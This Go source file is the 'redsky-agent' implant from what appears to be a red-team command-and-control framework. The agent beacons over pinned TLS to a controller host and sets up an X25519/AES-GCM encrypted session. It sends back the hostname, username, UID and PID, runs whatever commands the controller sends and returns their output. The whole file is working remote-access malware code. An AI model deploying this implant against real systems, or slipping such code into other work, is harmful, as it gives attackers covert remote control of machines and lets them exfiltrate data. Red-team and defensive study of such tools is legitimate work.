// redsky-agent — the implant.
// Phase 2: TLS with CA fingerprint pinning + X25519 ECDH + AES-256-GCM.
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

func main() {
	host := flag.String("host", "127.0.0.1", "core host")
	port := flag.Int("port", 4444, "core port")
	interval := flag.Int("interval", 5, "beacon interval seconds")
	tag := flag.String("tag", "", "agent tag (used to derive ID)")
	caFP := flag.String("ca-fingerprint", "", "SHA-256 fingerprint of the engagement CA (colon hex)")
	flag.Parse()

	if *caFP == "" {
		log.Fatalf("no -ca-fingerprint given; get it from core's startup log")
	}

	agentID := *tag
	if agentID == "" {
		agentID = fmt.Sprintf("rs-%08x", rand.Uint32())
	}

	log.Printf("redsky-agent starting id=%s target=%s:%d (TLS)", agentID, *host, *port)

	for {
		if err := beaconOnce(*host, *port, agentID, *caFP); err != nil {
			log.Printf("beacon: %v", err)
		}
		time.Sleep(time.Duration(*interval) * time.Second)
	}
}

func beaconOnce(host string, port int, agentID, caFP string) error {
	tlsCfg, err := rsTLS.ClientTLSConfig(caFP)
	if err != nil {
		return fmt.Errorf("tls config: %w", err)
	}
	rawConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 5*time.Second)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer rawConn.Close()
	conn := tls.Client(rawConn, tlsCfg)
	if err := conn.Handshake(); err != nil {
		return fmt.Errorf("tls handshake: %w", err)
	}

	// --- ECDH handshake ---
	// 1. Read core's hello.
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		return fmt.Errorf("read hello: %w", err)
	}
	var hello map[string]string
	if err := json.Unmarshal(frame.Payload, &hello); err != nil {
		return fmt.Errorf("bad hello: %w", err)
	}
	if hello["type"] != "ecdh_hello" {
		return fmt.Errorf("expected ecdh_hello, got %s", hello["type"])
	}
	corePub, err := base64.StdEncoding.DecodeString(hello["pubkey"])
	if err != nil {
		return fmt.Errorf("bad core pubkey: %w", err)
	}

	// 2. Agent generates its ephemeral key and replies with its pubkey.
	agentKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		return fmt.Errorf("gen key: %w", err)
	}
	reply := map[string]string{
		"type":   "ecdh_reply",
		"pubkey": base64.StdEncoding.EncodeToString(agentKey.PublicKey().Bytes()),
	}
	replyRaw, _ := json.Marshal(reply)
	if err := wire.WriteFrame(conn, 0, replyRaw); err != nil {
		return fmt.Errorf("send reply: %w", err)
	}

	// 3. Both sides derive the same AES-256 session key.
	key, err := crypto.DeriveKey(agentKey, corePub)
	if err != nil {
		return fmt.Errorf("derive key: %w", err)
	}
	sess, err := crypto.NewSession(key)
	if err != nil {
		return fmt.Errorf("new session: %w", err)
	}

	// --- encrypted loop ---
	// 4. Send beacon (encrypted).
	info := collectInfo()
	beacon := proto.Beacon{AgentID: agentID, Info: info, TS: time.Now().Unix()}
	if err := sendEncrypted(conn, sess, proto.TypeBeacon, beacon); err != nil {
		return fmt.Errorf("send beacon: %w", err)
	}

	// 5. Read one task.
	frame, err = wire.ReadFrame(conn)
	if err != nil {
		return fmt.Errorf("read task: %w", err)
	}
	taskRaw, err := sess.Decrypt(frame.Payload)
	if err != nil {
		return fmt.Errorf("decrypt task: %w", err)
	}
	var env proto.Envelope
	if err := json.Unmarshal(taskRaw, &env); err != nil {
		return fmt.Errorf("task envelope: %w", err)
	}

	switch env.Type {
	case proto.TypeTask:
		var task proto.Task
		if err := json.Unmarshal(env.Payload, &task); err != nil {
			return fmt.Errorf("task payload: %w", err)
		}
		result := runTask(task)
		if err := sendEncrypted(conn, sess, proto.TypeResult, result); err != nil {
			return fmt.Errorf("send result: %w", err)
		}
	case proto.TypeSleep:
		var s proto.Sleep
		_ = json.Unmarshal(env.Payload, &s)
		log.Printf("core requested sleep %dms (phase 2 ignores)", s.MS)
	case proto.TypeKill:
		log.Printf("core requested kill, exiting")
		os.Exit(0)
	}
	return nil
}

func collectInfo() proto.AgentInfo {
	hostname, _ := os.Hostname()
	usr := "?"
	uid := -1
	if u, err := user.Current(); err == nil {
		usr = u.Username
		fmt.Sscanf(u.Uid, "%d", &uid)
	}
	return proto.AgentInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     usr,
		UID:      uid,
		PID:      os.Getpid(),
		Capabilities: []string{"exec", "file_get", "file_put", "tls", "aes-gcm"},
	}
}

func runTask(t proto.Task) proto.Result {
	timeout := time.Duration(t.Timeout) * time.Second
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	cmd := exec.Command(t.Cmd, t.Args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return proto.Result{TaskID: t.ID, Error: err.Error(), ExitCode: -1}
	}
	go func() { done <- cmd.Wait() }()

	select {
	case err := <-done:
		rc := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				rc = ee.ExitCode()
			} else {
				rc = -1
			}
		}
		return proto.Result{
			TaskID:   t.ID,
			Stdout:   stdout.String(),
			Stderr:   stderr.String(),
			ExitCode: rc,
		}
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return proto.Result{TaskID: t.ID, Error: "timeout", ExitCode: -1}
	}
}

func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	enc, err := sess.Encrypt(envBytes)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, wire.FlagEncrypted, enc)
}
